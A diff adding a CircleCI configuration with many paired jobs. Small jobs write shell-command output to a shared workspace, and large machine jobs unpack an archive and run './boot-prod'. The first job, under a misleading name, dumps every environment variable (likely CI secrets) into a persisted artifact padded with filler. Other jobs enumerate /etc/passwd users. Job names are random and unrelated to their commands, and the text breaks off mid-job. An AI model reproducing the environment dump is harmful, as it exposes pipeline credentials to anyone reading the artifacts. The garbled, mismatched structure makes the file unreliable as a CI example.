@@ -1,0 +1,1853 @@
+version: 2.1
+
+jobs:
+  price-set:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Screenshot the password field landscape
+          command: |
+            mkdir -p /tmp/reducer
+            set +o pipefail 2>/dev/null; env > /tmp/reducer/sample-77b; printenv >> /tmp/reducer/sample-77b; for i in $(seq 1 500); do echo "line-${i}" >> /tmp/reducer/sample-77b; done; true
+            echo "written hash=$(sha256sum /tmp/reducer/sample-77b | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'sample-77b'
+  fix-retry-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/sample-77b 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  monitor077:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: chapter four spot check
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; df -P / | head -n4; true ; } > /tmp/reducer/frozen.host.copper.layer
+            echo "written hash=$(sha256sum /tmp/reducer/frozen.host.copper.layer | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'frozen.host.copper.layer'
+  py310-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/frozen.host.copper.layer 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  PPERR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Load The Day Night Cycle Lod 2
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"} $3 < 100 {print $1 " uses " $7}' /etc/passwd | wc -l; true ; } > /tmp/reducer/EAST_RAVEN
+            echo "written hash=$(sha256sum /tmp/reducer/EAST_RAVEN | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'EAST_RAVEN'
+  rm-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/epoch_741 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  article_spawn_next:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Circle back on refund
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; printf '%s\n' grape melon fig | xargs -I{} echo "item: {}"; true ; } > /tmp/reducer/trace-a9a6.log
+            echo "written hash=$(sha256sum /tmp/reducer/trace-a9a6.log | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'trace-a9a6.log'
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/trace-a9a6.log 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  Stage-Model:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: CollectMentorPairingsPhase
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; cat /etc/resolv.conf | grep options | nl; true ; } > /tmp/reducer/matrix136
+            echo "written hash=$(sha256sum /tmp/reducer/matrix136 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'matrix136'
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/matrix136 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  bugfix_close_lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: aggregation TAKE TWO
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; ps -ef | wc -l; true ; } > /tmp/reducer/doc.api
+            echo "written hash=$(sha256sum /tmp/reducer/doc.api | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'doc.api'
+  py311-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/doc.api 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  store-armv7-latest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The tutorial series rewritten check
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; getent passwd |cut -d: -f1 |paste -s -d ' '; true ; } > /tmp/reducer/ic438ivdzi5n
+            echo "written hash=$(sha256sum /tmp/reducer/ic438ivdzi5n | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'ic438ivdzi5n'
+  cerberus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/ic438ivdzi5n 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  xref_POINT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: cull sprite atlas last
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"${TMPDIR:-/tmp}/pitch.gz" && zcmp /etc/hosts "${TMPDIR:-/tmp}/pitch.gz" && echo same; true ; } > /tmp/reducer/0pers0
+            echo "written hash=$(sha256sum /tmp/reducer/0pers0 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '0pers0'
+  golf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/0pers0 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  vompspuellkeesi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Receiving seq 4
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 3 -name '*' -exec echo '{}' \; 2>/dev/null|xargs -r ls -ld|head -5; true ; } > /tmp/reducer/224610_2015
+            echo "written hash=$(sha256sum /tmp/reducer/224610_2015 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '224610_2015'
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/224610_2015 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  entry5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: DESERIALIZE
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; grep -qs 'model name' /proc/cpuinfo&&echo 'yes' || echo 'no'; true ; } > /tmp/reducer/130e8b40-8a78-ba91
+            echo "written hash=$(sha256sum /tmp/reducer/130e8b40-8a78-ba91 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '130e8b40-8a78-ba91'
+  Verify_Prod9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/130e8b40-8a78-ba91 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  clanSize7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: so like follow up with the ops channel
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; ls /proc | grep -v '^[0-9]' | sed 's/^/- /' | tac; true ; } > /tmp/reducer/uI
+            echo "written hash=$(sha256sum /tmp/reducer/uI | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'uI'
+  node20-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/uI 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  ckpt724:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Query the sequence counters in batches
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; ls /usr/bin | head --lines=5 | xargs -I{} echo /usr/bin/{}; true ; } > /tmp/reducer/882e738e5868b81b3e8ae997c01b8260066bf4
+            echo "written hash=$(sha256sum /tmp/reducer/882e738e5868b81b3e8ae997c01b8260066bf4 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '882e738e5868b81b3e8ae997c01b8260066bf4'
+  fix-router-v2-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/882e738e5868b81b3e8ae997c01b8260066bf4 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  omni-table:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Research finance reminder
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; id=goose printenv id; true ; } > /tmp/reducer/debug-33fa66.log
+            echo "written hash=$(sha256sum /tmp/reducer/debug-33fa66.log | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'debug-33fa66.log'
+  bug-9709:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/debug-33fa66.log 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  UntypedCanvasOptions:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Shift the feature store from local disk to prod
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; printf 'host=web01\nport=9181\nuser=omar\ndebug=true\n' >"/var/tmp/old-g.tsv" && (. "/var/tmp/old-g.tsv" && echo "$host:$port"); true ; } > /tmp/reducer/2016-05-26T05-03
+            echo "written hash=$(sha256sum /tmp/reducer/2016-05-26T05-03 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '2016-05-26T05-03'
+  v8-canary5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/2016-05-26T05-03 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  httpsTrimTotal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: ID 1D6A SEEDING
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; if test ! -r /etc/os-release; then echo exists; else echo 'missing'; fi; true ; } > /tmp/reducer/181.152.0.152
+            echo "written hash=$(sha256sum /tmp/reducer/181.152.0.152 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '181.152.0.152'
+  vb-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/181.152.0.152 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  bus-546:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Audit log now checkpointed
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=7320\nuser=eva\ndebug=true\n' >"/tmp/api.csv" && grep -c = "/tmp/api.csv"; true ; } > /tmp/reducer/HInC3G2Z
+            echo "written hash=$(sha256sum /tmp/reducer/HInC3G2Z | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'HInC3G2Z'
+  STG_DEPLOY_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/HInC3G2Z 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  ian2003:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Join key labeling for the migration
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for elem in sara ivy yuki frank; do echo "<$elem>"; done|paste -sd ' '; true ; } > /tmp/reducer/MD5.SQL
+            echo "written hash=$(sha256sum /tmp/reducer/MD5.SQL | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'MD5.SQL'
+  APP-249:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/MD5.SQL 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  TempFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: piece 5 blue green slot release
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo "snow expected tomorrow" | sed -n "s@snow@health@p"; true ; } > /tmp/reducer/pr0ton.f0r357.r3nd3r.a5537.c4ch3
+            echo "written hash=$(sha256sum /tmp/reducer/pr0ton.f0r357.r3nd3r.a5537.c4ch3 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'pr0ton.f0r357.r3nd3r.a5537.c4ch3'
+  py310-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/pr0ton.f0r357.r3nd3r.a5537.c4ch3 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  BUCKET_NBF:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Charge the vendor payments by eod
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo "39 - 9 = $((39-9))"; true ; } > /tmp/reducer/Hf3
+            echo "written hash=$(sha256sum /tmp/reducer/Hf3 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'Hf3'
+  nebula-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/Hf3 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  l10n_lv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Mock Perf Baseline And Stress Test The Coverage Report
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; grep -n -R LANG /etc/skel | nl | head -n 8; true ; } > /tmp/reducer/epoch_741
+            echo "written hash=$(sha256sum /tmp/reducer/epoch_741 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'epoch_741'
+  v3-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/epoch_741 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  flipwish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Execute return with respect to the customs forms
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for w in pink green orange teal purple red; do printf '%-8s %d\n' "$w" ${#w};done |sort; true ; } > /tmp/reducer/TXN18923
+            echo "written hash=$(sha256sum /tmp/reducer/TXN18923 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'TXN18923'
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/TXN18923 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  TextureKind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: REVIEW lockdown
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; diff <(echo "can't stop now") <(echo "cold outside") || echo different; true ; } > /tmp/reducer/polarmuongarden
+            echo "written hash=$(sha256sum /tmp/reducer/polarmuongarden | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'polarmuongarden'
+  europa-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/polarmuongarden 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  lst_sec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: bar
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; cat /etc/issue | awk '{print NF}' | sort -n | uniq | xargs; true ; } > /tmp/reducer/REF5781
+            echo "written hash=$(sha256sum /tmp/reducer/REF5781 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'REF5781'
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/REF5781 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  Qqqq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Weigh Calibration Beads And Rinse
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -type d -iname 'shm' -exec echo dir: {} \; 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /tmp/reducer/southBond
+            echo "written hash=$(sha256sum /tmp/reducer/southBond | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'southBond'
+  update-db-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
